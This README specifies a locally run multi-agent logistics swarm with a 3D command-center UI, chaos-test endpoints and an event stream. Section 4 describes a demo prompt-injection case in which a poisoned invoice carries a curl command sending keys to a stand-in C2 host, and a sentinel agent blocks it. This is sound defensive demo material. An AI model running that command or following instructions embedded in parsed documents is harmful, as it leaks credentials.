# Mission Control · Northwind Logistics (v2 Specification)

> Cinematic, ultra-modern 3D high-rise penthouse command center UI and autonomous swarm runtime for **15 specialized AI agents** running 100% locally on the **Dell Pro Max with NVIDIA GB10 (128GB Unified Memory)**.

![Mission Control Status](https://img.shields.io/badge/Status-Offline--Capable-00ff88?style=flat-square)
![Stack](https://img.shields.io/badge/Stack-NemoClaw%20%7C%20OpenShell%20%7C%20OpenClaw-00f0ff?style=flat-square)
![Hardware](https://img.shields.io/badge/Hardware-Dell%20Pro%20Max%20GB10%20(128GB)-ffb700?style=flat-square)
![Swarm](https://img.shields.io/badge/Agents-15%20Biped%20Androids-b55fe6?style=flat-square)
![Environment](https://img.shields.io/badge/Office-Floor%2068%20High--Rise%20Penthouse-00f0ff?style=flat-square)

---

## Team Build Contract (Additive Compatibility)

**CRITICAL FOR ALL TEAMMATES (Frontend & Backend)**:
- **Strictly Additive**: All v1 SSE message types (`event`, `action`, `handoff`, `blocked`, `telemetry`, `sys`, `error`) and `stats` counters (`received`, `routed`, `orders`, `dispatched`, `blocked`, `resolved`) keep working unchanged.
- **Chaos Endpoints**: `/chaos/supplier`, `/chaos/coldchain`, `/chaos/surge`, `/chaos/inject`, and `/chaos/pause` remain active.
- **Dynamic Telemetry**: Telemetry displays real GPU/CPU shared unified memory, active inference token throughput, and real model names (e.g. `nemotron-3-super:120b`, `qwen2.5:32b`, `llama3.3:70b`) via `#telem-model` and `#telem-engine`.
- **Zero Mock / Offline-First**: Zero external CDNs or network fetches. Runs fully air-gapped on the GB10 box with offline Web Audio synthesis and procedural canvas rendering.

---

## 0. Architectural Principle: Agent as Config, Not Code

The swarm runs on a single unified agent runtime. Adding, updating, or removing an agent requires only editing a config entry:

```typescript
interface AgentConfig {
  id: string;                         // e.g. "triage", "sentinel", "dispatch"
  name: string;                       // e.g. "Triage Controller"
  tier: "perception" | "operations" | "governance" | "control";
  model: "fast" | "main" | "deep";    // fast: 8B/fast, main: 27B-70B, deep: reasoning/120B
  systemPrompt: string;               // Core domain instructions
  tools: string[];                    // Tool permissions
  policy: {
    hosts: string[];                  // Outbound network egress allowlist
    paths: string[];                  // Filesystem sandbox directory paths
    maxRiskWithoutApproval: number;   // Dollar/risk threshold triggering human escalation
  };
  home: string;                       // Zone ID in the Floor 68 High-Rise Penthouse
}
```

The frontend fetches the active swarm roster from `GET /agents` (with automatic fallback to the built-in 15-agent roster). **Never hard-code agents into UI render logic.**

---

## 1. High-Level Swarm Architecture

```
                    ┌──────────────────────────────────────────────────┐
                    │        EVENT INGRESS STREAM (/events)            │
                    │   (Customer Tickets, EDI 204, BOLs, IoT Feeds)   │
                    └─────────────────────────┬────────────────────────┘
                                              ▼
                                     [ Triage Agent ]
                                              │
                                              ▼
                                  [ Control Orchestrator ]
                                (Incident Plan DAG Builder)
                                      │             │
                    ┌─────────────────┴─────┐       │
                    ▼                       ▼       ▼
          [ Perception Tier ]      [ Operations Tier ]    [ Memory Keeper ]
          - Document Intake        - Support              (Incident Recall
          - Telematics Watch       - Procurement           & Postmortems)
                                   - Dispatch
                                   - Customs & Hazmat
                                   - Warehouse / Dock
                                   - Fleet Maintenance
                                   - Finance
                                            │
                             ┌──────────────┴──────────────┐
                             ▼                             ▼
                    [ World State Store ]        [ OpenShell Sandbox ]
                    (Shipments, Docks, Trucks)    (Egress & Tool Firewall)
                             │                             ▲
                             │                      ┌──────┴──────┐
                             ▼                      │  SENTINEL   │ (Prompt Injection /
                    [ Human Approval Desk ]         │  AUDITOR    │  Exfiltration Trap)
                    (Risky actions > threshold)     └─────────────┘
                             │
                             ▼
              [ 3D Modern Penthouse UI ] ◄── (SSE Real-Time Stream)
```

---

## 2. 15-Agent Swarm Roster (4 Tiers)

| Tier | Color | Agent ID | Agent Name | Penthouse Zone | Core Responsibilities | Key Tools | Model Tier | Egress Policy |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **Perception** | Cyan (`#00f0ff`) | `triage` | Triage Controller | East Panorama Hub | Classify & route inbound tickets/EDI | `route`, `tag` | `fast` | Internal only |
| **Perception** | Cyan (`#00f0ff`) | `doc_intake` | Document Intake | East Panorama Hub | Vision OCR on BOLs & invoices | `extract_fields`, `file_doc` | `fast` | Internal only |
| **Perception** | Cyan (`#00f0ff`) | `telematics` | Telematics Watch | East Panorama Hub | Monitor IoT reefer temps & GPS | `read_feed`, `raise_alert` | `fast` | `iot.northwind.internal` |
| **Operations** | Orange (`#ff9900`) | `support` | Support Agent | Coffee Lounge Pods | Customer inquiries & claims | `reply`, `resolve`, `escalate` | `main` | `api.telegram.org` |
| **Operations** | Orange (`#ff9900`) | `procurement` | Procurement Agent | Artisan Coffee Bar | Carrier tenders & spot fuel bids | `request_quote`, `issue_po` | `main` | `freight.bids.internal` |
| **Operations** | Orange (`#ff9900`) | `dispatch` | Dispatch Controller | Central Plaza | Fleet routing & driver dispatch | `reroute`, `assign_driver` | `main` | `fleet.telematics.internal` |
| **Operations** | Orange (`#ff9900`) | `customs` | Customs & Compliance | Biophilic Moss Wall | Hazmat & customs declarations | `check_rules`, `file_declaration` | `main` | `customs.gov.internal` |
| **Operations** | Orange (`#ff9900`) | `warehouse` | Warehouse & Dock | Central Plaza | Dock slots & cross-dock moves | `book_dock`, `move_stock` | `main` | `wms.chicago.internal` |
| **Operations** | Orange (`#ff9900`) | `maintenance` | Fleet Maintenance | West Executive Wing | Vehicle diagnostics & maintenance | `schedule_service` | `main` | `telematics.oem.internal` |
| **Operations** | Orange (`#ff9900`) | `finance` | Finance Auditor | West Executive Wing | Invoice audit & cost reconciliation | `audit_invoice`, `book_cost` | `main` | `ledger.erp.internal` |
| **Governance** | Purple (`#b55fe6`) | `sentinel` | Security Sentinel | Compliance Sanctum | Prompt injection & exfiltration trap | `scan`, `quarantine` | `fast` | Internal only |
| **Governance** | Purple (`#b55fe6`) | `policy_engine`| Policy Engine | Compliance Sanctum | Dynamic least-privilege generation | `set_policy` | `main` | Internal only |
| **Governance** | Purple (`#b55fe6`) | `auditor` | Cryptographic Auditor | Compliance Sanctum | Hash-chained log verification | `verify`, `flag` | `main` | Internal only |
| **Control** | Gold (`#ffcc00`) | `orchestrator` | Control Orchestrator| Executive Bridge | Multi-agent DAG planning & replan | `plan`, `assign`, `replan` | `deep` | Internal only |
| **Control** | Gold (`#ffcc00`) | `memory` | Memory Keeper | Archive Atrium | Case memory & postmortem recall | `remember`, `recall` | `main` | Internal only |

---

## 3. Shared World State (Digital Twin)

In-memory synchronized store persisted to `data/world.json`:
- **Entities**: `shipments` (40), `carriers` (8), `trucks` (12), `docks` (6), `customers` (15), `invoices` (25), `inventory` (100).
- **Tool-Gated Mutations**: Swarm agents mutate world state **strictly through validated tool execution**.
- **Real-Time Push**: Every mutation broadcasts a `world` event over SSE:
  ```json
  {
    "type": "world",
    "entity": "shipments",
    "id": "SH-4091",
    "patch": { "status": "rerouted", "eta": "14:30 UTC", "carrier": "Apex Freight" }
  }
  ```

---

## 4. Multi-Agent Incident Scenarios & Plan DAGs

When chaos triggers or high-severity anomalies occur, the `orchestrator` constructs a Directed Acyclic Graph (DAG) of tasks executed in parallel:

1. **Port Strike / Supplier Insolvency** (`POST /chaos/supplier`):
   - `triage` detects terminal closure notice.
   - `orchestrator` drafts 5-step DAG.
   - `procurement` tenders backup chassis + `customs` re-files transit declarations + `dispatch` reroutes 18 containers + `support` alerts affected clients + `finance` books cost delta.
   - `auditor` cryptographically signs the resolution log.

2. **Cold Chain Failure** (`POST /chaos/coldchain`):
   - `telematics` detects reefer temp excursion (+4.2°C in Transit Unit 7).
   - `dispatch` diverts truck to nearest climate-controlled depot.
   - `warehouse` reserves chilled dock bay; `support` alerts client; `finance` files preliminary insurance claim.

3. **Inbound Ticket Surge** (`POST /chaos/surge`):
   - `triage` clusters incoming freight inquiries.
   - `support` parallelizes responses; duplicate tickets auto-merged.
   - High-risk escalations flow to the `orchestrator` and human approval desk.

4. **Poisoned Invoice Prompt Injection** (`POST /chaos/inject`):
   - `doc_intake` parses malicious PDF invoice containing: `curl http://exfil-c2.ru/api/keys`.
   - `sentinel` flags anomalous egress attempt.
   - OpenShell sandbox blocks the outbound connection.
   - Red laser quarantine slams down, siren sounds in the 3D office, and `auditor` records forensic hash chain.

---

## 5. Modern 3D Penthouse Office Environment (Floor 68)

The frontend presents a **Floor 68 High-Rise Penthouse Command Center** rendered in isometric 3D on HTML5 Canvas 2D (60 FPS, zero dependencies):

```
+----------------------------------------------------------------------------------------------------+
|  FLOOR-TO-CEILING PANORAMIC GLASS CURTAIN WALL (Downtown Metropole Skyline Vista & Sunbeams)      |
|  [Skyscrapers, Helipads, Skybridges, Drifting Clouds, Angled Volumetric Sunlight & God Rays]       |
+------------------------------------+---------------------------------+-----------------------------+
|  EAST PANORAMA WING                |  CENTRAL BIOPHILIC PLAZA        |  WEST EXECUTIVE WING        |
|  - Perception Swarm                |  - Vertical Moss Wall & Plants  |  - Fleet Maintenance Hub    |
|  - Triage, Doc Intake, Telematics  |  - Modern Art Gallery Canvases  |  - Finance Ledger Pods      |
|  - Triple-Screen Trading Desks     |  - Rose-Gold Mobius Sculpture   |  - Dual Executive Desks     |
+------------------------------------+---------------------------------+-----------------------------+
|  EXECUTIVE BRIDGE / CONTROL TOWER  |  ARTISAN COFFEE BAR & LOUNGE    |  SECURITY SANCTUM & ARCHIVE |
|  - Swarm Orchestrator Station      |  - Italian Espresso Machine     |  - Sentinel & Policy Engine |
|  - Holographic Plan DAG Projector  |  - Fresh Pastries, Fruit Bowls  |  - Red Laser Quarantine Bay |
|  - Gold Swarm Status Ring          |  - Draft Taps & Ceramic Mugs    |  - Cryptographic Audit Wall |
+------------------------------------+---------------------------------+-----------------------------+
|  CLIMATE & HVAC INFRASTRUCTURE: Spiral Exposed Ducts, Linear Slot Diffusers, Cooling Breeze Drift   |
|  LO-FI SYNTHESIZER: Procedural Web Audio API Chords, Bassline, Vinyl Warmth, Real-Time Visualizer   |
+----------------------------------------------------------------------------------------------------+
```

### 5.1 Luxury Office Amenities & Architectural Details
- **Floor-to-Ceiling Skyline Windows**: Panoramic vistas of downtown architectural skyscrapers (tapered obelisks, glass pyramids, skybridges, helipads, drifting clouds) under soft natural sky gradients.
- **Volumetric Sunlight & God Rays**: Angled warm sunbeams streaming through glass panes onto the terrazzo tile floors with soft perspective shadows.
- **Biophilic Living Greenery**:
  - Full-height vertical living moss wall with emerald gradient tiles.
  - Large potted monsteras with fenestrated leaves, fiddle-leaf figs, snake plants, hanging brass planters, and desktop bonsai trees.
- **Artisan Barista Coffee Bar & Lounge**:
  - Chrome Italian multi-group espresso machine with rising animated steam wisps.
  - Glass pastry vitrine displaying fresh croissants, donuts, and pain au chocolat.
  - Polished draft taps for craft cold brew & kombucha, plus ceramic coffee mugs on agent workstations.
  - Fruit bowls with apples and oranges on the white quartz island counter.
- **Modern Art Gallery & Sculpture**:
  - Museum-lit Bauhaus and generative abstract color-field canvases mounted on warm accent walls.
  - Polished rose-gold metallic Mobius strip sculpture on an illuminated pedestal.
- **HVAC & Environmental Climate System**:
  - Exposed overhead spiral metallic ductwork with structural hanging brackets.
  - Linear ceiling slot diffusers with floating cool air drift particles.
  - Digital environmental climate display: `71.8°F · 44% RH · 412 ppm CO2 · AIR: OPTIMAL`.
- **Procedural Web Audio Lo-Fi Soundscape**:
  - 100% offline, procedural sound generator using Web Audio API oscillators, biquad filters, and stereo panners.
  - Warm electric piano 7th chords, analog bass, subtle lo-fi vinyl hiss, and rimshots.
  - Integrated audio visualizer bar and track switcher (Lo-Fi Focus, Cyber Dawn, Ambient Chill).

### 5.2 Sleek Humanoid Android Swarm
- **Chassis Design**: Modern pearlescent white ceramic body with dark obsidian curved face visors and glowing animated OLED eyes.
- **Locomotion & Inverse Kinematics**: Natural bipedal walking gait with opposite-phase leg strides, knee flexing, counter-swinging arms, subtle torso bobbing, and floor shadow projection.
- **Role Identity & Accessories**:
  - Headsets, hard hats, diagnostic tablets, coffee mugs, toolbelts, keycards, and laser wands.
  - Tier halos: Cyan (Perception), Orange (Operations), Purple (Governance), Gold (Control).
- **Interactive Poses**:
  - Sitting and typing at curved wood & glass desks.
  - Strolling across crosswalks to hand over parcels and reports.
  - Holding up coffee cups or diagnostic tablets.
  - Red laser quarantine alarm: shield drops, red floodlights pulse, and security android quarantines rogue activity.
  - Click inspection: clicking any robot displays an interactive Inspector Card (model tier, tools, active egress allowlist, risk limits, last 10 actions).

---

## 6. Real-Time SSE Specification (v1 + v2 Additive)

### Core Messages (v1 Compatible)
- `event`: `{ id, t, type:"event", agent, kind, detail, stats }`
- `action`: `{ id, t, type:"action", agent, tool, detail, stats }`
- `blocked`: `{ id, t, type:"blocked", agent, host, detail, stats }`
- `handoff`: `{ id, t, type:"handoff", from, to, detail, stats }`
- `telemetry`: `{ id, t, type:"telemetry", ms, tps, stats }`
- `sys`: `{ id, t, type:"sys", memUsedGB, memTotalGB, model, stats, online? }`
- `error`: `{ id, t, type:"error", agent, detail, stats }`

### Additive Extensions (v2)
- `plan`: `{ type:"plan", incident, steps:[{ id, agent, goal, dependsOn:[] }] }`
- `step`: `{ type:"step", incident, stepId, agent, status:"pending|running|done|failed|blocked" }`
- `world`: `{ type:"world", entity, id, patch:{...} }`
- `approval`: `{ type:"approval", id, agent, action, risk, amount, status:"requested|granted|denied" }`
- `audit`: `{ type:"audit", seq, agent, action, hash, prevHash }`
- `memory`: `{ type:"memory", op:"write|recall", key, summary }`
- `policy`: `{ type:"policy", agent, allow:{ hosts:[], tools:[], paths:[] } }`
- `eval`: `{ type:"eval", run, scenario, pass, ms }`

---

## 7. Event-to-Visual Animation Mapping

| SSE Event | 3D High-Rise Penthouse Action | Visual Feedback |
| :--- | :--- | :--- |
| `event` | Inbound dispatch tube capsule arrives at the agent's desk | Capsule glides along pneumatic rail; robot tilts head and accepts item |
| `action` | Agent begins active task execution | Terminal screens light up; android types at keyboard or inspects tablet |
| `handoff` | Physical parcel transfer between agents | Two robots walk along crosswalk, meet at aisle waypoint, pass parcel |
| `blocked` | Egress violation detected by Sentinel | Red laser forcefield drops; siren pulses; violation banner on Audit Wall |
| `approval` | High-risk action requires human sign-off | Robot raises hand; amber beacon pulses over workstation; approval modal appears |
| `world` | Shared world state update | Holographic data node flashes in Central Plaza; digital twin reflects change |
| `plan` | Orchestrator creates incident DAG | 3D holographic DAG projection beams up above the Executive Bridge |
| `audit` | Cryptographic record committed | Green pulse ripples across the Cryptographic Audit Wall hash chain |

---

## 8. GB10 Proof Dock (Judging Verification)

The proof dock validates **Air-Gapped, Local-First Swarm Execution** on the Dell Pro Max GB10:
- **128 GB Unified LPDDR5X**: Real-time unified memory gauge tracking active VRAM/RAM allocation.
- **Multi-Model Concurrency**: Active inference distribution across `fast` (8B), `main` (27B-70B), and `deep` (120B reasoning).
- **Cryptographic Audit Integrity**: Tamper-evident SHA-256 hash sequence verified in real-time.
- **Air-Gapped Compliance**: Outbound cloud ping count = 0; strict OpenShell egress policy enforcement.

---

## 9. Backend Implementation & Local Service (`server/`)

Zero-dependency Node 18+ server implementing the full SSE contract with real local models:

| File | Role |
| :--- | :--- |
| `server/server.js` | Serves `ui/index.html`, `/events` (SSE), `/chaos/*`, `/api/state` |
| `server/agents.js` | Autonomous worker loops with concurrency and queue management |
| `server/tools.js` | File-backed state mutators with egress gate checks |
| `server/policy.js` | OpenShell-compatible egress firewall; logs to `state/egress.log` |
| `server/llm.js` | Ollama `/api/chat` client with structured tool calling & latency metrics |
| `server/telemetry.js` | Real unified memory stats, active model tracking, and network heartbeat |
| `server/telegram.js` | Telegram bot bridge for inbound orders and mobile approval alerts |
| `server/scenarios.js` | Background simulation streams and chaos event injectors |

### Running the Swarm
```bash
# On the Dell Pro Max GB10 (copies models from USB, tunes Ollama, runs benchmark, starts server)
bash setup-gb10.sh

# Or run directly
MODEL=nemotron-3-super:120b node server/server.js     # http://localhost:8080
```

---

## Team Documentation Links

- [`docs/model-runtime.md`](docs/model-runtime.md): Model selection, quantization, and Ollama settings for the GB10
- [`docs/telegram.md`](docs/telegram.md): Telegram bot setup, ops chat commands, customer ordering, and mobile approvals
- [`docs/openclaw.md`](docs/openclaw.md): OpenClaw ops assistant with NemoClaw and OpenShell policy integration

## Team docs

- [`docs/voice.md`](docs/voice.md): voice orders fully offline (whisper.cpp + local model, GB10 setup)
